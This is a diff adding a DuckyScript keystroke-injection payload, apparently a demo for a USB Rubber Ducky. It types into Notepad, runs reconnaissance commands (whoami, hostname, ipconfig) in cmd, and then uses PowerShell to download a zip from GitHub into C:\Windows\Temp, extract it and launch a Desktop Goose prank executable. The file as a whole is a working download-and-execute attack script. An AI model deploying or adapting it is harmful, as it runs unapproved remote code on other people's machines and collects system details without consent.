@@ -1,0 +1,65 @@
+REM Utilize notepad, command prompt, and powershell.
+DELAY 3000
+
+REM Opening up notepad and writing notes.
+GUI r
+DELAY 500
+STRING notepad
+ENTER
+DELAY 750
+STRING Hi everyone! I opened up the notepad, but what else can I do?
+ENTER
+ENTER
+DELAY 500
+STRING Let's run some commands in command prompt.
+DELAY 500
+
+REM Opening up command prompt and running basic commands
+GUI r
+DELAY 500
+STRING cmd
+DELAY 500
+ENTER
+DELAY 750
+STRING whoami
+DELAY 500
+ENTER
+DELAY 300
+STRING hostname
+DELAY 300
+ENTER
+DELAY 500
+STRING ipconfig
+DELAY 300
+ENTER
+DELAY 500
+STRING ping 8.8.8.8
+DELAY 300
+ENTER
+STRING Let's work with Powershell now.
+DELAY 500
+
+REM Start Desktop Goose Program with Powershell and delete from task manager.
+GUI r
+DELAY 500
+STRING powershell
+DELAY 300
+ENTER
+DELAY 300
+REM Download zip from github, and unzip
+STRING Invoke-WebRequest https://github.com/mirpag/CyberTech/archive/refs/heads/main.zip -UseBasicParsing -Outfile C:\Windows\Temp\DesktopGoose.zip
+ENTER
+DELAY 10000
+STRING Expand-Archive -LiteralPath 'C:\Windows\Temp\DesktopGoose.zip' -DestinationPath 'C:\Windows\Temp\DesktopGoose' -Force
+ENTER
+DELAY 5000
+STRING Start-Process C:\Windows\Temp\DesktopGoose\CyberTech-main\RubberDucky\"DesktopGoose v0.3"\GooseDesktop.exe
+ENTER
+DELAY 30000
+
+GUI r
+DELAY 500
+STRING notepad
+ENTER
+DELAY 500
+STRING Thank you for watching!
